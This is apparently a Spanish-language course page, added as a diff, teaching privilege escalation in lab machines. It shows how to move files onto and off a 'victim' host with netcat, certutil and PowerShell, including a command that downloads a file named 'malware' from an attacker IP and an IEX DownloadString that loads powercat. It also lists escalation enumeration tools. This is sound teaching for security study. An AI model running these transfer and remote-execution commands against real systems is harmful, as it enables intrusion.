@@ -1,0 +1,396 @@
+<h1 id="1-escalada-de-privilegios">1. Escalada de privilegios.</h1>
+
+<h2 id="11-concepto">1.1. Concepto.</h2>
+<p>En ciberseguridad, <strong>elevación de privilegios</strong> es un intento malicioso de abusar de un error de configuración de una aplicación o sistema operativo para obtener la capacidad de acceder a regiones del sistema antes inaccesibles como información confidencial o la cuenta del administrador.</p>
+
+<p>Es importante tener en cuenta que esta se trata de una etapa de post-explotación, donde el atacante ya ha conseguido adentrarse al interior de una máquina y ha obtenido un control parcial de la máquina víctima y algunas veces es innecesaria, cuando el atacante ha conseguido desde el principio privilegios de superusuario o administrador sobre la máquina.</p>
+
+<p><br /></p>
+
+<h2 id="12-tipos-de-escalada-de-privilegios">1.2. Tipos de escalada de privilegios.</h2>
+
+<p>En definitiva, y ajustándonos a la definición anterior, por <em>elevación de privilegios</em> puede entenderse cualquier obtención de permisos que antes no se tenía sobre la máquina atacada. Es por eso que distinguimos en esencia dos tipos de elevación de privilegios:</p>
+
+<ul>
+  <li>
+    <p><strong>Escalada de privilegios vertical</strong>:</p>
+
+    <p>El atacante se hace cargo de una cuenta que tiene más permisos que la cuenta de entrada original. Esto se consigue gracias al hecho de que la mayoría de los sistemas y redes están diseñados para que los usuarios con permisos regulados puedan acceder a recursos superiores.</p>
+
+    <p>Esto además permite al atacante abandonar el sistema sin ser detectado, ya que puede, desde una cuenta con los suficientes permisos, borrar los registros de acceso.</p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>Escalada de privilegios horizontal</strong>:</p>
+
+    <p>El atacante se hace cargo de una cuenta que posee le mismo nivel de acceso que el usuario que inició el ataque cibernético.</p>
+
+    <p>En general, la elevación de privilegios horizontal requiere de más conocimientos que los que se requiere en la elevación de privilegios horizontal ya que no existen vectores claros que permitan obtener las credenciales de otra cuenta del sistema, se necesitan de técnicas más sofisticadas que a menudo requieren, más que de un fallo informático, de un fallo humano como el phising o spearphising.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h1 id="2-transmisión-de-ficheros">2. Transmisión de ficheros.</h1>
+
+<p>Una técnica para elevar privilegios consiste en introducir en la máquina víctima un ejecutable malicioso programado precisamente para elevar privilegios aunque también existen otros mecanismos.</p>
+
+<p>A continuación vamos a ver distintos comandos que podemos utilizar para transmitir ficheros entre dos máquinas en función de la dirección de la transmisión y el tipo de sistema operativo.</p>
+
+<p>En esencia, se tiene que lo que se hace en todos lo casos es montar una estructura servidor-cliente en la que se traspasa un fichero de un lado a otro haciendo uso de un <strong>puerto</strong> y un <strong>protocolo</strong>. La estructura que se monta depende del comando utilizado.</p>
+
+<p><br /></p>
+
+<h2 id="21-linux-a-linux">2.1. Linux a Linux.</h2>
+<h3 id="211-subir-ficheros-a-la-máquina-víctima">2.1.1. Subir ficheros a la máquina víctima.</h3>
+
+<ul>
+  <li>
+    <p><strong>Servidor HTTP sencillo</strong>: Mediante este método monta un servidor web python simple que también puede estar alojado en cualquier otro servidor pero lo usaremos por su sencillez, y luego lo descargaremos con wget en la víctima (o curl si no lo está, instalado).</p>
+
+    <p>En primer lugar, desde la máquina atacante con <strong>python -m SimpleHTTPServer 80</strong> montamos un servidor en la carpeta desde la que vamos a coger un archivo desde la máquina víctima.</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124151634.png" text-align="center" />
+  </div>
+
+    <p>Por otro lado, desde la máquina víctima nos conectamos al servidor montado llevando a cabo una petición <strong>wget</strong> <strong>con el servicio que riga en el puerto en el que se ha montado el servidor en la máquina atacante</strong>. En este caso a ser el puerto 80 nos corresponde una petición http.</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124152014.png" text-align="center" />
+  </div>
+
+    <p><br /></p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124152727.png" text-align="center" />
+  </div>
+
+    <p>La misma operación se puede efectuar con <strong>curl</strong>:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-o</span> ficherotransferido http://&lt;IPAtacker&gt;/ficheroatraspasar
+</code></pre></div>    </div>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>SCP</strong> (SSH utility):</p>
+
+    <p>Este método tan sólo es válido cuando la máquina víctima tiene el servicio ssh instalado y además tenemos las credenciales.</p>
+
+    <p>En este contexto podemos utilizar <strong>scp</strong> para efectuar nuestra operación.</p>
+
+    <p>En primer lugar, con nmap investigamos los puertos que la máquina tiene abierto:</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124155140.png" text-align="center" />
+  </div>
+
+    <p>Observamos que tiene el puerto 22 abierto, indicio de que dicha máquina puede tener un servidor ssh abierto escuchando en el 22. Así, de esta manera se tiene que intentamos la conexión sabiendo además las credenciales de un usuario de la máquina:</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124155656.png" text-align="center" />
+  </div>
+
+    <p><br /></p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124155721.png" text-align="center" />
+  </div>
+
+    <p>Es conveniente notar que, en este caso, los papeles están invertidos; la máquina víctima ejerce el papel de servidor y nosotros somos el cliente que solicitamos una petición ssh a la máquina víctima mediante el comando <strong>scp</strong> que no es más que efectuar un <strong>cp</strong> a través de ssh.</p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>Netcat</strong>: Netcat es una herramienta que podemos utilizar para generar comunicaciones entre máquinas. Este se puede utilizar respectivamente para bien mandar una petición o fichero o bien para escuchar y recibir una peticion desde un determinado puerto:</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124161628.png" text-align="center" />
+  </div>
+
+    <p>En concreto, en el caso de la máquina víctima podemos pedir que escuche una petición con el modificador <strong>-l</strong>, en un determinado puerto con <strong>-p</strong> y que además verbalice las operaciones que hace con <strong>-v</strong> y lo que sea que escuche en dicho puerto lo rediriga al fichero que especifiquemos.</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124162504.png" text-align="center" />
+  </div>
+
+    <p>Por otra parte, en la máquina atacante utilizamos netcat para pasar un fichero hacia una IP en un puerto y además añadimos el modificador <strong>-w</strong> para añadir un <em>timeout</em> y evitar que se bloquee dado que se trata de un fichero muy grande.</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124164615.png" text-align="center" />
+  </div>
+
+    <p><br /></p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124165048.png" text-align="center" />
+  </div>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>FTP</strong>: Vamos a montar un servidor ftp temporal utilizando el comando <strong>twistd</strong> y luego posteriormente bajar el archivo con <strong>wget</strong>.</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124172050.png" text-align="center" />
+  </div>
+
+    <p>Como podemos observar se tiene que se ha generado un servidor web que escucha en el puerto 2121. Así, desde la máquina víctima:</p>
+
+    <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220124172255.png" text-align="center" />
+  </div>
+
+    <p>Y se habría descargado nuestro archivo.</p>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<h3 id="212-bajar-ficheros-de-la-máquina-víctima">2.1.2. Bajar ficheros de la máquina víctima.</h3>
+
+<p>Para descargar un fichero desde la máquina atacante de la máquina víctima podemos aplicar la misma estructura con los papeles invertidos. Es decir, en lugar de montar el servidor en lado del atacante y descargar el fichero desde la víctima (cliente), montamos el servidor en lado de la víctima y descargamos el fichero desde el lado del atacante (cliente).</p>
+
+<p>Así, todos los ejemplos anteriores son válidos invirtiendo los papeles de las máquinas.</p>
+
+<p><br /></p>
+
+<h2 id="22-windows-a-linux">2.2. Windows a Linux.</h2>
+
+<p>Para el caso de windows vamos a utilizar dos máquinas, la metasploitable y la Windowsploitable donde la Windowsploitable actúa a modo de máquina víctima.</p>
+
+<p><br /></p>
+
+<h3 id="221-subir-ficheros-a-la-máquina-víctima">2.2.1. Subir ficheros a la máquina víctima.</h3>
+
+<ul>
+  <li>
+    <p><strong>Powershell DownloadFile</strong>:</p>
+
+    <p>En este caso construiremos con la máquina atacante un servidor HTTP con python en el que alojaremos el fichero deseado y seguidamente los descargaremos desde la otra máquina Windows a través de powershell:</p>
+
+    <ul>
+      <li>
+        <p><strong>Linux</strong>: Montamos el servidor http con python.</p>
+
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python <span class="nt">-m</span> SimpleHTTPServer 8080
+</code></pre></div>        </div>
+        <p><br /></p>
+
+        <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220130103937.png" text-align="center" />
+  </div>
+
+        <p><br /></p>
+      </li>
+      <li>
+        <p><strong>Windows</strong>: Descargamos el fichero con powershell.</p>
+
+        <p><br /></p>
+
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  powershell.exe <span class="nt">-c</span> <span class="s2">"(New-Object System.NET.WebClient).DownloadFile('http://10.0.2.4:8080/malware','C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\u</span><span class="s2">ser</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\m</span><span class="s2">alware')"</span>
+</code></pre></div>        </div>
+        <p><br /></p>
+
+        <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220130103819.png" text-align="center" />
+  </div>
+
+        <p><br />
+  y ahí tendríamos nuestro fichero.</p>
+      </li>
+    </ul>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>Certutil.exe</strong>:</p>
+
+    <p>Certutil.exe se trata de otra herramienta que nos permite descargar ficheros de un servidor web. Así, en primer lugar, montamos un servidor http en la máquina atacante y luego descargamos desde la máquina víctima el fichero deseado con la herramienta antes descrita:</p>
+
+    <ul>
+      <li>
+        <p><strong>Linux</strong>: Montamos el servidor con python:</p>
+
+        <p><br /></p>
+
+        <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220130104909.png" text-align="center" />
+  </div>
+
+        <p><br /></p>
+      </li>
+      <li>
+        <p><strong>Windows</strong>: Descargamos el fichero a través de certutil.exe:</p>
+
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  certutil.exe <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> http://10.10.10.1:8080/malware malware
+</code></pre></div>        </div>
+
+        <p><br /></p>
+
+        <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220130104845.png" text-align="center" />
+  </div>
+
+        <p><br /></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Netcat</strong>:</p>
+
+    <p>Podemos utilizar netcat para descargar un fichero desde windows, exactamente igual a como hemos hecho con Linux.</p>
+
+    <ul>
+      <li>
+        <p><strong>Windows</strong>: Desde la máquina víctima escuchamos desde cierto puerto con netcat y le decimos que transfiera lo que escuche al fichero malware:</p>
+
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc.exe <span class="nt">-lvp</span> 4444 <span class="o">&gt;</span> malware
+</code></pre></div>        </div>
+
+        <p><br /></p>
+
+        <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220130111018.png" text-align="center" />
+  </div>
+
+        <p><br /></p>
+      </li>
+      <li>
+        <p><strong>Linux</strong>: Desde la máquina atacante enviamos el fichero malware a través de netcat en el puerto especificado.</p>
+
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc 10.10.10.2 4444 <span class="nt">-w</span> 3 &lt; malware
+</code></pre></div>        </div>
+
+        <p><br /></p>
+
+        <div style="text-align:center">
+  <img src="/assets/img/M7/Pasted%20image%2020220130111046.png" text-align="center" />
+  </div>
+
+        <p><br /></p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="222-bajar-ficheros-de-la-máquina-víctima">2.2.2. Bajar ficheros de la máquina víctima.</h3>
+
+<ul>
+  <li>
+    <p><strong>Netcat</strong>: Podemos invertir los papeles del caso anterior, escuchamos desde la máquina atacante y envíamos el fichero con netcat en windows.</p>
+  </li>
+  <li>
+    <p><strong>Powercat</strong> (PowerShell):</p>
+
+    <p>Windows:</p>
+
+    <p><br /></p>
+
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/malware(http://10.10.10.1/powercat.ps1)');powercat -l -p 4444 -i C:\Users\test\malware"</span><span class="w">
+</span></code></pre></div>    </div>
+
+    <p><br /></p>
+
+    <p>Linux:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wget http://10.10.10.2:4444/malware
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h1 id="3-herramientas-de-recolección">3. Herramientas de recolección.</h1>
+<h2 id="31-ayuda-en-elevación-de-privilegios-en-sistemas-linux">3.1. Ayuda en elevación de privilegios en Sistemas Linux.</h2>
+
+<ul>
+  <li>
+    <p><strong>Linux Exploit Suggester 2</strong>:  Sugerencia de exploits.
+   <a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>linuxprivchecker</strong>: Enumerar la información básica del sistema y buscar vectores de escalada de privilegios comunes.
+  <a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>LinEnum</strong>: 
+  <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>BeRoot</strong>:
+  <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">https://github.com/AlessandroZ/BeRoot/tree/master/Linux</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>GTFOBins</strong>: Como aprovechar comandos para conseguir info<br />
+  <a href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h2 id="32-ayuda-en-elevación-de-privilegios-en-sistemas-windows">3.2. Ayuda en elevación de privilegios en Sistemas Windows.</h2>
+
+<ul>
+  <li>
+    <p><strong>Windows Exploit Suggester - Next Generation</strong>:<br />
+  <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>LOLBas</strong>: Como aprovechar comandos para conseguir info<br />
+  <a href="https://lolbas-project.github.io/#">https://lolbas-project.github.io/#</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>BeRoot</strong>:<br />
+  <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Windows">https://github.com/AlessandroZ/BeRoot/tree/master/Windows</a></p>
+
+    <p><br /></p>
+  </li>
+  <li>
+    <p><strong>Seatbelt</strong>:  es un proyecto de C# que realiza una serie de “comprobaciones de seguridad” desde las perspectiva ofensiva y defensiva.</p>
+
+    <p><a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h1 id="3-gtfobins">3. GTFOBins.</h1>
+
+<p>GTFOBins es una lista seleccionada de archivos binarios de Unix que se pueden usar para eludir las restricciones de seguridad locales en sistemas mal configurados.</p>
+
+<p>Por ejemplo podemos observar que respecto a elevar privilegios podemos buscar respecto de nano el siguiente mecanismo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/M7/Pasted%20image%2020220302233314.png" text-align="center" />
+</div>
+
+<p>De esta forma, si en un sistema operativo tuviéramos configurado utilizar nano como root sin emplear contraseña, es decir; si pudiéramos utilizar el comando <strong>sudo nano</strong>  sin poner contraseña empleariamos el comando anterior con el siguiente resultado:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/M7/Pasted%20image%2020220302235010.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/M7/Pasted%20image%2020220302235113.png" text-align="center" />
+</div>
+
+<p>Llevando a cabo una elevación de privilegios y tomando control de la máquina.</p>
